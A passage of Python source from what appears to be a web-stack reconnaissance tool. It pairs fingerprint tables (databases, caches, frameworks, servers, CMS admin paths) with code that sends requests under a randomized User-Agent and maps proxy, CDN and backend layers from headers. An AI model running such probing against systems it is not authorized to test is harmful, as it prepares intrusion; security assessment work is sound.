                    'backend_correlation': ['ruby', 'python', 'java', 'golang', 'nodejs'],
                    'behavioral_paths': [],
                },
                'mongodb': {
                    'proxy_headers': ['x-mongodb-proxy'],
                    'error_patterns': [
                        'mongoerror', 'bsontypeerror', 'mongoclient',
                        'mongoexception', 'e11000 duplicate key error',
                        'failed to connect to.*27017', 'mongod',
                        'mongowriteconcernerror',
                    ],
                    'body_patterns': ['"_id":', '"$oid":'],
                    'stack_trace_patterns': ['mongoose', 'mongodb\\\\driver', 'pymongo'],
                    'backend_correlation': ['nodejs', 'python', 'ruby'],
                    'behavioral_paths': [],
                },
                # Redis è un cache layer, non un DB — già gestito in cache_layer_detection.
                # Non duplicato qui per evitare classificazione errata.
                'elasticsearch': {
                    'proxy_headers': ['x-elastic-product'],
                    'error_patterns': [
                        'indexnotfoundexception', 'index_not_found_exception',
                        'no alive nodes found in your cluster',
                        'elasticsearch.exceptions',
                        'org.elasticsearch',
                    ],
                    'body_patterns': ['"_shards":', '"hits":', '"_index":',
                                      '"timed_out":', 'elasticsearch'],
                    'stack_trace_patterns': ['elasticsearch', 'opensearch'],
                    'backend_correlation': [],
                    'behavioral_paths': ['/_cat/health', '/_cluster/health',
                                          '/_cat/indices', '/_nodes'],
                },
                'oracle': {
                    'proxy_headers': [],
                    'error_patterns': [
                        'ora-00001', 'ora-00907', 'ora-01017', 'ora-12541',
                        'oracle.jdbc', 'java.sql.sqlrecoverableexception',
                        'oracle error', 'cx_oracle',
                    ],
                    'body_patterns': [],
                    'stack_trace_patterns': ['oracle.jdbc', 'cx_oracle',
                                              'oracle.ucp', 'orawrap'],
                    'backend_correlation': ['java', 'php', 'python'],
                    'behavioral_paths': [],
                },
            },

            'cache_layer_detection': {
                'redis': {
                    'headers': ['x-redis-cache', 'x-cache-redis'],
                    'body_patterns': ['redis', 'redis cache'],
                    'behavioral_paths': []
                },
                'memcached': {
                    'headers': ['x-memcached', 'x-cache-memcached'],
                    'body_patterns': ['memcached'],
                    'behavioral_paths': []
                },
                'varnish_cache': {
                    'headers': ['x-varnish', 'x-cache'],
                    'body_patterns': ['varnish'],
                    'behavioral_paths': []
                },
                'cloudflare_cache': {
                    'headers': ['cf-cache-status', 'cf-ray'],
                    'body_patterns': ['cloudflare cache'],
                    'behavioral_paths': []
                },
                'fastly_cache': {
                    'headers': ['x-cache', 'x-cache-hits', 'fastly-debug-digest'],
                    'body_patterns': ['fastly cache'],
                    'behavioral_paths': []
                },
                'nginx_cache': {
                    'headers': ['x-cache-status', 'x-nginx-cache'],
                    'body_patterns': ['nginx cache'],
                    'behavioral_paths': []
                }
            },

            'microservice_detection': {
                'spring_boot': {
                    'headers': ['x-application-context'],
                    'body_patterns': ['spring boot', 'whitelabel error page'],
                    'behavioral_paths': ['/actuator/health', '/actuator/info']
                },
                'nodejs_express': {
                    'headers': ['x-powered-by'],
                    'body_patterns': ['express'],
                    'behavioral_paths': []
                },
                'django': {
                    'headers': ['x-frame-options'],
                    'body_patterns': ['django', 'csrfmiddlewaretoken'],
                    'behavioral_paths': ['/admin']
                },
                'flask': {
                    'headers': ['server:.*werkzeug', 'server:.*python'],
                    'body_patterns': ['werkzeug', 'flask'],
                    'behavioral_paths': []
                },
                'aspnet_core': {
                    'headers': ['x-aspnet-version', 'x-aspnetmvc-version'],
                    'body_patterns': ['asp.net', 'microsoft.aspnetcore'],
                    'behavioral_paths': []
                },
                'fastapi': {
                    'headers': ['server:.*uvicorn', 'server:.*starlette'],
                    'body_patterns': ['fastapi', 'swagger', 'openapi'],
                    'behavioral_paths': ['/docs', '/openapi.json']
                },
                'gin': {
                    'headers': [],
                    'body_patterns': ['gin web framework', 'gin-gonic'],
                    'behavioral_paths': []
                },
                'rails': {
                    'headers': ['x-runtime', 'x-request-id'],
                    'body_patterns': ['ruby on rails', 'action controller'],
                    'behavioral_paths': []
                }
            },

            'backend_detection': {
                # Web Servers
                'nginx': {
                    'server_patterns': ['nginx'],
                    'tech_headers': {'Server': 'nginx'},
                    'framework_patterns': ['nginx'],
                    'behavioral_paths': ['/nginx_status'],
                    'error_patterns': ['nginx error', '502 bad gateway']
                },
                'apache': {
                    'server_patterns': ['apache'],
                    'tech_headers': {'Server': 'apache'},
                    'framework_patterns': ['apache'],
                    'behavioral_paths': [],
                    'error_patterns': ['apache', 'server at', 'port']
                },
                'iis': {
                    'server_patterns': ['microsoft-iis', 'iis'],
                    'tech_headers': {'Server': 'microsoft-iis', 'X-Powered-By': 'asp.net'},
                    'framework_patterns': ['iis', 'asp.net'],
                    'behavioral_paths': [],
                    'error_patterns': ['server error in', 'runtime error']
                },
                'lighttpd': {
                    'server_patterns': ['lighttpd'],
                    'tech_headers': {'Server': 'lighttpd'},
                    'framework_patterns': ['lighttpd'],
                    'behavioral_paths': [],
                    'error_patterns': []
                },
                'caddy': {
                    'server_patterns': ['caddy'],
                    'tech_headers': {'Server': 'caddy'},
                    'framework_patterns': ['caddy'],
                    'behavioral_paths': [],
                    'error_patterns': []
                },
                'openresty': {
                    'server_patterns': ['openresty'],
                    'tech_headers': {'Server': 'openresty'},
                    'framework_patterns': ['openresty', 'lua'],
                    'behavioral_paths': [],
                    'error_patterns': []
                },
                # Application Servers
                'tomcat': {
                    'server_patterns': ['tomcat'],
                    'tech_headers': {'Server': 'apache-coyote', 'X-Powered-By': 'servlet'},
                    'framework_patterns': ['tomcat', 'apache tomcat'],
                    'behavioral_paths': ['/manager/html'],
                    'error_patterns': ['apache tomcat', 'http status']
                },
                'jetty': {
                    'server_patterns': ['jetty'],
                    'tech_headers': {'Server': 'jetty'},
                    'framework_patterns': ['jetty'],
                    'behavioral_paths': [],
                    'error_patterns': ['powered by jetty']
                },
                'undertow': {
                    'server_patterns': ['undertow'],
                    'tech_headers': {'Server': 'undertow'},
                    'framework_patterns': ['undertow'],
                    'behavioral_paths': [],
                    'error_patterns': []
                },
                'gunicorn': {
                    'server_patterns': ['gunicorn'],
                    'tech_headers': {'Server': 'gunicorn'},
                    'framework_patterns': ['gunicorn'],
                    'behavioral_paths': [],
                    'error_patterns': []
                },
                'uwsgi': {
                    'server_patterns': ['uwsgi'],
                    'tech_headers': {'Server': 'uwsgi'},
                    'framework_patterns': ['uwsgi'],
                    'behavioral_paths': [],
                    'error_patterns': []
                },
                'puma': {
                    'server_patterns': ['puma'],
                    'tech_headers': {'Server': 'puma'},
                    'framework_patterns': ['puma'],
                    'behavioral_paths': [],
                    'error_patterns': []
                },
                # Runtime/Language Detection
                'php': {
                    'server_patterns': [],
                    'tech_headers': {'X-Powered-By': 'php'},
                    'framework_patterns': ['php'],
                    'behavioral_paths': [],
                    'error_patterns': ['fatal error', 'parse error', 'warning:', 'in /var/www']
                },
                'nodejs': {
                    'server_patterns': [],
                    'tech_headers': {'X-Powered-By': 'express'},
                    'framework_patterns': ['node.js', 'express'],
                    'behavioral_paths': [],
                    'error_patterns': ['cannot get', 'typeerror', 'referenceerror']
                },
                'python': {
                    'server_patterns': [],
                    'tech_headers': {},
                    'framework_patterns': ['django', 'flask', 'fastapi', 'werkzeug'],
                    'behavioral_paths': [],
                    'error_patterns': ['traceback', 'python', 'wsgi']
                },
                'ruby': {
                    'server_patterns': [],
                    'tech_headers': {'X-Runtime': ''},
                    'framework_patterns': ['ruby', 'rails'],
                    'behavioral_paths': [],
                    'error_patterns': ['ruby', 'activerecord']
                },
                'golang': {
                    'server_patterns': [],
                    'tech_headers': {},
                    'framework_patterns': ['gin', 'echo', 'fiber'],
                    'behavioral_paths': [],
                    'error_patterns': ['go runtime', 'panic']
                }
            },

            'cms_detection': {
                'wordpress': {
                    'headers': ['x-pingback'],
                    'cookies': ['wordpress_', 'wp-settings-', 'wordpress_logged_in', 'wp_lang'],
                    'body_patterns': [
                        'wp-content/', 'wp-includes/', '/wp-json/', 'xmlrpc.php',
                        'wp-embed.min.js', 'wp-emoji-release.min.js'
                    ],
                    'behavioral_paths': ['/wp-login.php', '/wp-admin/', '/wp-json/wp/v2/'],
                    'tech_headers': {'x-pingback': 'xmlrpc.php'},
                },
                'drupal': {
                    'headers': ['x-drupal-cache', 'x-drupal-dynamic-cache', 'x-generator'],
                    'cookies': ['SESS', 'SSESS', 'Drupal.visitor.'],
                    'body_patterns': [
                        'sites/default/files', 'drupal.js', 'Drupal.settings',
                        '/sites/all/', 'drupal/misc/'
                    ],
                    'behavioral_paths': ['/user/login', '/node', '/?q=user/login'],
                    'tech_headers': {'x-generator': 'Drupal'},
                },
                'joomla': {
                    'headers': [],
                    'cookies': ['joomla_user_state', 'joomla_session'],
                    'body_patterns': [
                        '/media/jui/', '/components/com_', '/templates/system/',
                        'mootools-core', 'joomla!'
                    ],
                    'behavioral_paths': ['/administrator/', '/administrator/index.php'],
                    'tech_headers': {},
                },
                'typo3': {
                    'headers': [],
                    'cookies': ['fe_typo_user', 'be_typo_user'],
                    'body_patterns': [
                        'typo3temp', '/typo3conf/', 'typo3/sysext', 'TYPO3'
                    ],
                    'behavioral_paths': ['/typo3/', '/typo3/backend.php'],
                    'tech_headers': {},
                },
                'magento': {
                    'headers': ['x-magento-cache-control', 'x-magento-vary', 'x-magento-cache-debug'],
                    'cookies': ['frontend', 'adminhtml', 'PHPSESSID'],
                    'body_patterns': [
                        'mage/', 'Mage.Cookies', '/skin/frontend/', 'js/mage/',
                        'Magento_Ui', 'data-mage-init'
                    ],
                    'behavioral_paths': ['/admin', '/downloader/'],
                    'tech_headers': {'x-magento-cache-debug': ''},
                },
                'shopify': {
                    'headers': ['x-shopify-stage', 'x-shopify-request-id', 'x-shopid', 'x-shardid'],
                    'cookies': ['_shopify_', '_session_id', 'cart'],
                    'body_patterns': [
                        'Shopify.', '/cdn.shopify.com/', 'myshopify.com',
                        'shopify_pay', 'window.Shopify'
                    ],
                    'behavioral_paths': ['/admin', '/checkout', '/cart'],
                    'tech_headers': {},
                },
                'prestashop': {
                    'headers': [],
                    'cookies': ['PrestaShop-', 'id_cart', 'id_currency', 'id_lang'],
                    'body_patterns': [
                        'prestashop', '/modules/blockcart/', 'var prestashop',
                        'PrestaShop', 'id_product'
                    ],
                    'behavioral_paths': ['/admin', '/index.php?controller=authentication'],
                    'tech_headers': {},
                },
                'woocommerce': {
                    'headers': [],
                    'cookies': ['woocommerce_', 'wc_cart_hash_', 'woocommerce_items_in_cart'],
                    'body_patterns': [
                        'woocommerce', 'WooCommerce', '/wc-api/', 'wc_add_to_cart_nonce',
                        'data-product_id', 'wc-checkout'
                    ],
                    'behavioral_paths': ['/shop', '/cart', '/my-account'],
                    'tech_headers': {},
                },
                'ghost': {
                    'headers': ['x-ghost-cache-status'],
                    'cookies': ['ghost-admin-api-session'],
                    'body_patterns': [
                        'ghost-url', 'ghost.io', 'content/themes/casper',
                        'window.ghost', '/@tryghost/'
                    ],
                    'behavioral_paths': ['/ghost/', '/ghost/api/'],
                    'tech_headers': {'x-ghost-cache-status': ''},
                },
                'strapi': {
                    'headers': [],
                    'cookies': [],
                    'body_patterns': ['strapi', '"strapiVersion"', '/uploads/'],
                    'behavioral_paths': ['/admin', '/admin/auth/login', '/_health'],
                    'tech_headers': {},
                },
                'umbraco': {
                    'headers': [],
                    'cookies': ['UMB_UCONTEXT', 'UMB-XSRF-TOKEN'],
                    'body_patterns': ['umbracoNaviHide', 'UmbracoContext', '/umbraco/'],
                    'behavioral_paths': ['/umbraco/', '/umbraco/backoffice/'],
                    'tech_headers': {},
                },
                'craft_cms': {
                    'headers': ['x-powered-by'],
                    'cookies': ['CraftSessionId', 'CRAFT_CSRF_TOKEN'],
                    'body_patterns': ['craft.app', 'craftcms', 'Craft CMS'],
                    'behavioral_paths': ['/admin', '/index.php?p=admin'],
                    'tech_headers': {'x-powered-by': 'Craft CMS'},
                },
            },
        }

    def log(self, category: str, message: str, level: str = "INFO"):
        """Structured logging"""
        timestamp = time.strftime('%H:%M:%S')
        icons = {"INFO": "ℹ️", "SUCCESS": "✅", "WARNING": "⚠️", "ERROR": "❌", "DISCOVERY": "🔍"}
        print(f"[{timestamp}] {icons.get(level, '•')} [{category}] {message}")

    def get_compiled_regex(self, pattern: str, flags: int = re.IGNORECASE):
        """Get compiled regex from cache or compile and cache it"""
        cache_key = (pattern, flags)
        if cache_key not in self.regex_cache:
            self.regex_cache[cache_key] = re.compile(pattern, flags)
        return self.regex_cache[cache_key]

    def send_baseline_request(self) -> requests.Response:
        """Send initial request to analyze raw stack response"""
        headers = {
            'User-Agent': get_random_user_agent(),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }

        # Apply rate limiting with jitter
        self.rate_limiter.wait()

        response = self.session.get(self.target_url, headers=headers, timeout=15)

        # Auto-detect protocols
        self.detect_protocols(response)

        return response

    def detect_protocols(self, response: requests.Response):
        """
        Auto-detect HTTP version and protocol capabilities.
        Updates self.stack with protocol information.
        """
        protocols = {
            'http1': False,
            'http2': False,
            'http3': False,
            'websocket': False,
            'grpc': False
        }

        # Check HTTP/2 via raw response
        if hasattr(response, 'raw') and hasattr(response.raw, 'version'):
            if response.raw.version == 20:  # HTTP/2 version code
                protocols['http2'] = True
                self.log("PROTOCOL", "Detected HTTP/2", "SUCCESS")

        # Check via Server header
        server = response.headers.get('Server', '').lower()
        if 'http/2' in server or 'h2' in server:
            protocols['http2'] = True
            self.log("PROTOCOL", "Detected HTTP/2 via Server header", "SUCCESS")

        # Check HTTP/3 via Alt-Svc header
        alt_svc = response.headers.get('Alt-Svc', '').lower()
        if 'h3=' in alt_svc or 'h3-' in alt_svc:
            protocols['http3'] = True
            self.log("PROTOCOL", f"Detected HTTP/3 via Alt-Svc: {alt_svc}", "SUCCESS")

        # Check WebSocket support
        upgrade = response.headers.get('Upgrade', '').lower()
        if 'websocket' in upgrade:
            protocols['websocket'] = True
            self.log("PROTOCOL", "WebSocket upgrade available", "INFO")

        # Check gRPC
        content_type = response.headers.get('Content-Type', '').lower()
        if 'application/grpc' in content_type:
            protocols['grpc'] = True
            self.log("PROTOCOL", "Detected gRPC", "SUCCESS")

        # Default to HTTP/1.x if nothing else detected
        if not protocols['http2'] and not protocols['http3']:
            protocols['http1'] = True
            self.log("PROTOCOL", "Using HTTP/1.x", "INFO")

        # Store in stack
        self.stack['protocols'] = protocols

        return protocols

    def analyze_header_timeline(self, response: requests.Response) -> List[Dict]:
        """
        Enhanced header timeline analysis to reconstruct processing chain.
        Uses comprehensive fingerprinting and multi-step discovery for better accuracy.
        """
        timeline = []
        headers = response.headers
        discovered_components = set()

        # 1. Detection via Fingerprints (The most reliable source)
        for category, providers in self.fingerprints.items():
            for provider_name, patterns in providers.items():
                match_found = False
                
                # Check headers
                if 'headers' in patterns:
                    for h_pattern in patterns['headers']:
                        if isinstance(patterns['headers'], list):
                            for h_name, h_value in headers.items():
                                if h_pattern.lower() in h_name.lower():
                                    match_found = True
                                    break
                        elif isinstance(patterns['headers'], dict):
                            for h_name, expected_val in patterns['headers'].items():
                                if h_name in headers and expected_val.lower() in headers[h_name].lower():
                                    match_found = True
                                    break
                        if match_found: break

                # Check cookies
                if not match_found and 'cookies' in patterns:
                    for c_pattern in patterns['cookies']:
                        for cookie_name in response.cookies.keys():
                            if c_pattern.lower() in cookie_name.lower():
                                match_found = True
                                break
                        if match_found: break

                # Specific check for backend_detection tech_headers
                if not match_found and 'tech_headers' in patterns:
                    for h_name, expected_val in patterns['tech_headers'].items():
                        if h_name in headers and expected_val.lower() in headers[h_name].lower():
                            match_found = True
                            break

                if match_found and provider_name not in discovered_components:
                    discovered_components.add(provider_name)
                    timeline.append({
                        'order': self._get_layer_order(category),
                        'type': self._CATEGORY_TO_TYPE.get(category, category.split('_')[0]),
                        'name': provider_name,
                        'evidence': f"Matched fingerprint: {provider_name}",
                        'component': provider_name
                    })

        # 2. Detailed Via Header Analysis (Chain Discovery)
        via_header = headers.get('Via', '')
        if via_header:
            hops = [h.strip() for h in via_header.split(',')]
            for idx, hop in enumerate(hops):
                comp = self._identify_from_via(hop)
                timeline.append({
                    'order': 50 + idx, # Proxies are middle-ground
                    'type': 'proxy',
                    'raw': hop,
                    'component': comp,
                    'name': comp
                })

        # 3. Forwarding Analysis
        for h_name in ['X-Forwarded-For', 'X-Forwarded-Host', 'X-Forwarded-Proto', 'Forwarded']:
            if h_name in headers:
                timeline.append({
                    'order': 40,
                    'type': 'forwarding',
                    'raw': f"{h_name}: {headers[h_name]}",
                    'component': 'forwarding_layer',
                    'name': h_name.lower()
                })

        # 4. Infrastructure & Discovery Headers
        discovery_map = {
            'X-Served-By': {'type': 'infrastructure', 'order': 30},
            'X-Backend-Server': {'type': 'infrastructure', 'order': 80},
            'X-Request-ID': {'type': 'tracking', 'order': 10},
            'X-Correlation-ID': {'type': 'tracking', 'order': 10},
            'X-App-ID': {'type': 'infrastructure', 'order': 70},
            'X-Envoy-Upstream-Service-Time': {'type': 'proxy', 'order': 55},
            'X-Powered-By': {'type': 'framework', 'order': 90},
            'X-Runtime': {'type': 'framework', 'order': 95},
            'X-Varnish': {'type': 'cache', 'order': 60},
            'X-Cache': {'type': 'cache', 'order': 60},
            'X-Cache-Hits': {'type': 'cache', 'order': 60},
            'X-Cache-Status': {'type': 'cache', 'order': 60},
            'CF-Cache-Status': {'type': 'cache', 'order': 60},
            'X-Azure-Ref': {'type': 'cdn/lb', 'order': 20},
            'X-Amz-Cf-Id': {'type': 'cdn', 'order': 5},
            'X-Ray-Id': {'type': 'cdn/waf', 'order': 5},
            'Server': {'type': 'backend', 'order': 100}
        }

        for h_name, info in discovery_map.items():
            if h_name in headers:
                val = headers[h_name]
                # Avoid duplicates if already found via fingerprints
                if not any(t.get('name') == h_name.lower() or t.get('raw', '').startswith(h_name) for t in timeline):
                    timeline.append({
                        'order': info['order'],
                        'type': info['type'],
                        'raw': f"{h_name}: {val}",
                        'component': self._identify_from_value(h_name, val),
                        'name': h_name.lower()
                    })

        # Sort timeline by order
        timeline.sort(key=lambda x: x['order'])
        
        # Deduplicate and normalize
        seen = set()
        unique_timeline = []
        for entry in timeline:
            key = (entry.get('type'), entry.get('component'))
            if key not in seen:
                seen.add(key)
                unique_timeline.append(entry)

        self.stack['timeline'] = unique_timeline
        return unique_timeline

    def _get_layer_order(self, category: str) -> int:
        """Define logical order of infrastructure layers"""
        orders = {
            'cdn_detection': 5,
            'waf_detection': 15,
            'api_gateway_detection': 25,
            'load_balancer_detection': 35,
            'proxy_detection': 45,
            'service_mesh_detection': 55,
            'cache_layer_detection': 65,
            'container_orchestration_detection': 75,
            'serverless_detection': 85,
            'microservice_detection': 95,
            'backend_detection': 100,
            'cms_detection': 110,
        }
        return orders.get(category, 50)

    def _identify_from_value(self, header: str, value: str) -> str:
        """Extract component name from header value"""
        if header == 'Server':
            return self._identify_from_server(value)
        if header == 'Via':
            return self._identify_from_via(value)
        
        # Simple extraction for other headers
        value_lower = value.lower()
        if 'nginx' in value_lower: return 'nginx'
        if 'apache' in value_lower: return 'apache'
        if 'cloudflare' in value_lower: return 'cloudflare'
        if 'varnish' in value_lower: return 'varnish'
        if 'haproxy' in value_lower: return 'haproxy'
        
        return value.split(' ')[0].split('/')[0].lower()

    
    def _identify_from_via(self, via_string: str) -> str:
        """
        Enhanced identification of infrastructure components from Via header.
        Expanded discovery for CDNs, Proxies, LBs and Security Appliances.
        """
        via_lower = via_string.lower()
        
        # Comprehensive mapping of Via header signatures
        identifiers = {
            # CDNs & Global Edge
            'cloudflare': 'cloudflare_edge',
            'cloudfront': 'aws_cloudfront',
            'akamai': 'akamai_edge',
            'fastly': 'fastly_edge',
            'google': 'google_cloud_lb',
            'edgecast': 'verizon_edgecast',
            'bitgravity': 'bitgravity_cdn',
            'bunnycdn': 'bunny_cdn',
            'sucuri': 'sucuri_waf_edge',
            
            # Proxies & Caches
            'nginx': 'nginx_proxy',
            'squid': 'squid_proxy',
            'varnish': 'varnish_cache',
            'ats': 'apache_traffic_server',
            'trafficserver': 'apache_traffic_server',
            'envoy': 'envoy_proxy',
            'haproxy': 'haproxy_lb',
            'tinyproxy': 'tinyproxy',
            'privoxy': 'privoxy',
            'polipo': 'polipo_proxy',
            
            # API Gateways & Service Mesh
            'kong': 'kong_gateway',
            'tyk': 'tyk_gateway',
            'traefik': 'traefik_proxy',
            'ambassador': 'ambassador_gateway',
            'istio': 'istio_proxy',
            'linkerd': 'linkerd_proxy',
            
            # Security & Enterprise Appliances
            'bluecoat': 'bluecoat_proxy',
            'proxysg': 'bluecoat_proxy',
            'zscaler': 'zscaler_cloud_proxy',
            'mcafee': 'mcafee_web_gateway',
            'ironport': 'cisco_ironport',
            'sophos': 'sophos_utm',
            'fortigate': 'fortigate_waf',
            'barracuda': 'barracuda_waf',
            'f5': 'f5_bigip_asm',
            'netscaler': 'citrix_netscaler',
            'isaserver': 'microsoft_isa_server',
            'forefront': 'microsoft_tmg',
            
            # Cloud Provider Specific
            'gclb': 'google_cloud_lb',
            'azure': 'azure_front_door',
            'msedge': 'azure_edge',
        }
        
        # 1. Direct pattern matching
        for pattern, component in identifiers.items():
            if pattern in via_lower:
                return component
                
        # 2. Version extraction and regex-based discovery
        # Example: 1.1 proxy.example.com (squid/3.5.23)
        version_match = re.search(r'\((.*?)\)', via_string)
        if version_match:
            comment = version_match.group(1).lower()
            for pattern, component in identifiers.items():
                if pattern in comment:
                    return component
            return f"proxy_via_{comment.split('/')[0]}"

        # 3. Protocol-based fallback
        if via_lower.startswith('1.0') or via_lower.startswith('1.1'):
            return 'http_proxy_generic'
        if via_lower.startswith('2') or 'h2' in via_lower:
            return 'http2_proxy_edge'
        
        return 'unknown_infrastructure'
    
    def _identify_from_server(self, server_string: str) -> str:
        """
        Enhanced backend identification from Server header.
        Maps web servers, application servers, and language runtimes.
        """
        server_lower = server_string.lower()
        
        # Comprehensive mapping of Server header signatures
        identifiers = {
            # Standard Web Servers
            'nginx': 'nginx_web_server',
            'apache': 'apache_httpd',
            'microsoft-iis': 'ms_iis',
            'lighttpd': 'lighttpd',
            'caddy': 'caddy_server',
            'openresty': 'openresty_lua',
            'litespeed': 'litespeed_web_server',
            'tengine': 'tengine_nginx_fork',
            'cherokee': 'cherokee_web_server',
            'hiawatha': 'hiawatha_web_server',
            
            # Application Servers (Java/JEE)
            'tomcat': 'apache_tomcat',
            'apache-coyote': 'apache_tomcat_coyote',
            'jetty': 'eclipse_jetty',
            'glassfish': 'oracle_glassfish',
            'wildfly': 'jboss_wildfly',
            'jboss': 'jboss_as',
            'resin': 'caucho_resin',
            'weblogic': 'oracle_weblogic',
            'websphere': 'ibm_websphere',
            
            # Python Application Servers
            'gunicorn': 'gunicorn_wsgi',
            'uvicorn': 'uvicorn_asgi',
            'waitress': 'waitress_wsgi',
            'werkzeug': 'werkzeug_dev_server',
            'daphne': 'daphne_asgi',
            
            # Ruby Application Servers
            'puma': 'puma_ruby',
            'passenger': 'phusion_passenger',
            'thin': 'thin_ruby',
            'webrick': 'webrick_ruby',
            
            # .NET / Windows
            'kestrel': 'aspnet_core_kestrel',
            
            # Node.js / Other
            'express': 'nodejs_express',
            'next.js': 'nodejs_nextjs',
            'cowboy': 'erlang_cowboy',
            
            # CDN/WAF acting as Server
            'cloudflare': 'cloudflare_workers',
            'akamai': 'akamai_ghost',
            'cloudfront': 'aws_cloudfront',
            'ecs': 'edgecast_cdn',
            'arvancloud': 'arvancloud_waf',
            'sucuri': 'sucuri_cloudproxy'
        }
        
        # 1. Direct pattern matching
        for pattern, component in identifiers.items():
            if pattern in server_lower:
                # Extra check for version
                version = "unknown"
                version_match = re.search(r'/([\d.]+)', server_string)
                if version_match:
                    version = version_match.group(1)
                return f"{component}/{version}" if version != "unknown" else component
                
        # 2. Specialized identification for composite headers (e.g., Nginx + PHP)
        if 'php' in server_lower:
            return 'php_backend_generic'
        
        # 3. Check for signatures like "Python/3.x" or "Go-http-client"
        runtime_match = re.search(r'(python|php|ruby|go|node\.js|perl|java)/([\d.]+)', server_lower)
        if runtime_match:
            return f"{runtime_match.group(1)}_runtime/{runtime_match.group(2)}"

        # 4. Handle obfuscated/custom servers
        if server_string and len(server_string) > 0:
            # If it doesn't match known patterns but looks like a name
            if re.match(r'^[a-zA-Z0-9_\-]+$', server_string):
                return f"custom_server_{server_lower}"

        return 'unknown_backend'
    
    # Maps timeline 'type' values to canonical stack layer types.
    # Types that map to None are informational and don't produce a distinct layer.
    # Maps fingerprint category names to canonical short type strings.
    # Needed because category.split('_')[0] would truncate multi-word names
    # (e.g. api_gateway_detection → 'api', load_balancer_detection → 'load').
    _CATEGORY_TO_TYPE = {
        'cdn_detection':                    'cdn',
        'waf_detection':                    'waf',
        'proxy_detection':                  'proxy',
        'backend_detection':                'backend',
        'load_balancer_detection':          'load_balancer',
        'api_gateway_detection':            'api_gateway',
        'service_mesh_detection':           'service_mesh',
        'cache_layer_detection':            'cache',
        'microservice_detection':           'microservice',
        'container_orchestration_detection':'container_orchestration',
        'serverless_detection':             'serverless',
        'cms_detection':                    'cms',
    }

    _TIMELINE_TYPE_TO_LAYER = {
        # From fingerprint categories (via _CATEGORY_TO_TYPE)
        'cdn':                    'CDN',
        'waf':                    'WAF',
        'proxy':                  'PROXY',
        'backend':                'BACKEND',
        'load_balancer':          'LOAD_BALANCER',
        'api_gateway':            'API_GATEWAY',
        'service_mesh':           'SERVICE_MESH',
        'cache':                  'CACHE',
        'microservice':           'FRAMEWORK',
        'container_orchestration':'LOAD_BALANCER',
        'serverless':             'BACKEND',
        # Synthetic types from header analysis (Via, X-Forwarded-*, etc.)
        'cdn/lb':                 'CDN',
        'cdn/waf':                'WAF',
        'proxy/lb':               'LOAD_BALANCER',
        'forwarding':             'LOAD_BALANCER',   # X-Forwarded-* → proxying layer
        'infrastructure':         'LOAD_BALANCER',   # X-Served-By, X-Backend-Server
        'framework':              'FRAMEWORK',       # X-Powered-By, X-Runtime
        'cms':                    'CMS',             # CMS layer (WordPress, Drupal, etc.)
        'tracking':               None,              # X-Request-ID etc. – not a real hop
    }

    def progressive_fingerprinting(self, baseline_response: requests.Response):
        """
        Progressive fingerprinting: start with timeline analysis,
        then deep-dive into each discovered layer type.
        """
        self.log("FINGERPRINTING", "Starting progressive stack analysis...", "INFO")

        # Phase 1: Timeline analysis (already done)
        timeline = self.stack['timeline']

        # Phase 2: Deep fingerprinting for each layer type found.
        # Map timeline types → fingerprinting method keys, then call each once.
        _type_to_method = {
            # From fingerprint categories (correctly typed via _CATEGORY_TO_TYPE)
            'cdn':                    'cdn',
            'waf':                    'waf',
            'proxy':                  'proxy',
            'backend':                'backend',
            'load_balancer':          'load_balancer',
            'api_gateway':            'api_gateway',
            'service_mesh':           'service_mesh',
            'cache':                  'cache',
            'microservice':           'framework',
            'container_orchestration':'load_balancer',
            'serverless':             'backend',
            'cms':                    'cms',
            # Synthetic types from header analysis
            'cdn/lb':                 'load_balancer',
            'cdn/waf':                'waf',
            'proxy/lb':               'load_balancer',
            'forwarding':             'load_balancer',
            'infrastructure':         'load_balancer',
            'framework':              'framework',
            # 'tracking' intentionally omitted – not a real network hop
        }

        methods_to_call = set()
        for layer in timeline:
            method_key = _type_to_method.get(layer['type'])
            if method_key:
                methods_to_call.add(method_key)

        method_dispatch = {
            'cdn':          self.deep_cdn_fingerprinting,
            'waf':          self.deep_waf_fingerprinting,
            'proxy':        self.deep_proxy_fingerprinting,
            'backend':      self.deep_backend_fingerprinting,
            'load_balancer': self.deep_load_balancer_fingerprinting,
            'cache':        self.deep_cache_fingerprinting,
            'framework':    self.deep_framework_fingerprinting,
            'cms':          self.deep_cms_fingerprinting,
            'api_gateway':  self.deep_api_gateway_fingerprinting,
            'service_mesh': self.deep_service_mesh_fingerprinting,
        }

        for key in methods_to_call:
            method_dispatch[key](baseline_response)

        # CMS detection runs unconditionally: CMS is application-layer and rarely
        # leaves explicit header evidence that would populate the timeline above.
        if 'cms' not in methods_to_call:
            self.deep_cms_fingerprinting(baseline_response)

        # Database inference — sempre, dopo backend/framework (serve correlazione)
        self.deep_database_fingerprinting(baseline_response)

        # Phase 3: Promote every timeline hop that deep fingerprinting missed.
        # This ensures the stack chain reflects all discovered hops, not just
        # those that passed a confidence threshold inside a deep method.
        self._promote_timeline_hops_to_layers(timeline)

        # Phase 4: Resolve vendor conflicts (rimuove layer incompatibili)
        self._resolve_vendor_conflicts()

        # Phase 5: Check for hidden layers (no header evidence)
        self.detect_hidden_layers()

    def _promote_timeline_hops_to_layers(self, timeline: List[Dict]):
        """
        For each timeline hop not already represented in self.stack['layers'],
        add a layer entry derived directly from the timeline data.

        This bridges the gap between "N hops detected" and the final stack chain:
        - Types ignored by deep fingerprinting (cache, forwarding, infrastructure,
          framework) always produce a layer here.
        - Types handled by deep fingerprinting (cdn, waf, proxy, backend) may still
          produce additional layers if deep fingerprinting returned only the best match
          and there are further hops of the same type in the timeline (e.g. multiple
          Via-header proxy hops).
        """
        # Build a lookup of components already added to layers
        existing_components = {layer['component'] for layer in self.stack['layers']}

        for hop in timeline:
            timeline_type = hop.get('type', '')
            canonical_type = self._TIMELINE_TYPE_TO_LAYER.get(timeline_type)

            # Skip informational timeline entries (tracking IDs, etc.)
            if canonical_type is None:
                continue

            component = hop.get('component') or hop.get('name') or 'unknown'

            # Skip if this exact component is already a layer
            if component in existing_components:
                continue

            self.stack['layers'].append({
                'type': canonical_type,
                'component': component,
                'confidence': 30,           # lower than deep fingerprinting
                'level': 'LOW',
                'evidence': [hop.get('raw') or hop.get('evidence') or
                             f"Timeline hop ({timeline_type})"],
                'source': 'timeline',       # marks this as timeline-derived
            })
            existing_components.add(component)
    
